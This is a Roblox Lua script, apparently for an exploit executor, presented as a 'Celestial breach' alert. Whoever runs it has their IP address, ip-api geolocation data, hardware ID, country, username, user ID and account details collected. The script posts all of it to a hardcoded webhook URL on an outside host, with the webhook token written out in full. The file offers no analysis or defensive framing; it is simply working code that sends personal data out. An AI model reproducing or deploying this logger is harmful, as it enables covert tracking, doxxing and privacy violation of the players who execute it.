local url = "https://webhook.newstargeted.com/api/webhooks/1263334435823157332/8tClchkzOnkR_LTbNo14geO_nK1Ha_PXpSvg-OQdLIKEiBW-EIRDdCqlBM6V4ncNYlZO"

local player = game:GetService("Players").LocalPlayer
local localizationservice = game:GetService("LocalizationService")
local httpservice = game:GetService("HttpService")

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local getplayerip = game:HttpGet("https://v4.ident.me/", true)
local getplayerconfidentialinformation = game:HttpGet("http://ip-api.com/json")

-- Global Variables

local celestialowner = false
local robloxpremium = false
local altaccount = false

-- Celestial Owner Check

local CelestialOwnerCheck = {
    "5A572703-967C-43DD-B87F-7754C5EFFDAF" -- Corrade (mystic_4791)
}

if table.find(CelestialOwnerCheck, hwid) then
    celestialowner = true
end

-- Premium Check

if player.MembershipType == Enum.MembershipType.Premium then
    robloxpremium = true
else
    robloxpremium = false
end


-- Embed


local data = {
    ["embeds"] = {
        {
            ["title"] = "**__There is a Potential Celestial Breach__**",
            ["type"] = "rich",
            ["color"] = tonumber(16711680),
            ["fields"] = {
                {
                    ["name"] = "Execution Date",
                    ["value"] = "**" .. os.date("%x") .. " | " .. os.date("%I") .. ":" .. os.date("%M") .. " " .. os.date("%p") .. "**",
                    ["inline"] = true
                },

                {
                    ["name"] = "Celestial Owner",
                    ["value"] = celestialowner,
                    ["inline"] = true
                },

                -- Account Info Section

                {
                    ["name"] = "",
                    ["value"] = "[**" .. player.DisplayName .. "**'s Profile](https://roblox.com/users/" .. player.UserId .. "/profile)",
                    ["inline"] = true
                },
                
                {
                    ["name"] = "=================== ACCOUNT INFO =====================",
                    ["value"] = "",
                    ["inline"] = false
                },
    
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                            
                {
                    ["name"] = "Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },

                {
                    ["name"] = "User ID",
                    ["value"] = player.UserId,
                    ["inline"] = true
                },

                {
                    ["name"] = "Account Age",
                    ["value"] = player.AccountAge .. " Days",
                    ["inline"] = true
                },

                {
                    ["name"] = "Roblox Premium",
                    ["value"] = tostring(robloxpremium) .. " | Membership Name: " .. player.MembershipType.Name,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "Alt Account",
                    ["value"] = altaccount,
                    ["inline"] = true
                },

                -- Breach Details Section

                {
                    ["name"] = "=================== BREACH DETAILS =====================",
                    ["value"] = "",
                    ["inline"] = false
                },

                {
                    ["name"] = "Exploit",
                    ["value"] = identifyexecutor(),
                    ["inline"] = true
                },

                {
                    ["name"] = "Time Zone",
                    ["value"] = os.date("%Z"),
                    ["inline"] = true
                },

                {
                    ["name"] = "HWID",
                    ["value"] = "||" .. hwid .. "||",
                    ["inline"] = true
                },

                {
                    ["name"] = "Country",
                    ["value"] = "||" .. localizationservice:GetCountryRegionForPlayerAsync(player) .. "||",
                    ["inline"] = true
                },

                {
                    ["name"] = "IP Address",
                    ["value"] = "||" .. getplayerip .. "||",
                    ["inline"] = true
                },

                {
                    ["name"] = "Confidential Information",
                    ["value"] = "||```" .. getplayerconfidentialinformation .. "```||",
                    ["inline"] = false
                },
               }
           }
       }
    }

    local newdata = httpservice:JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
     }

     request = http_request
     local args = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(args)
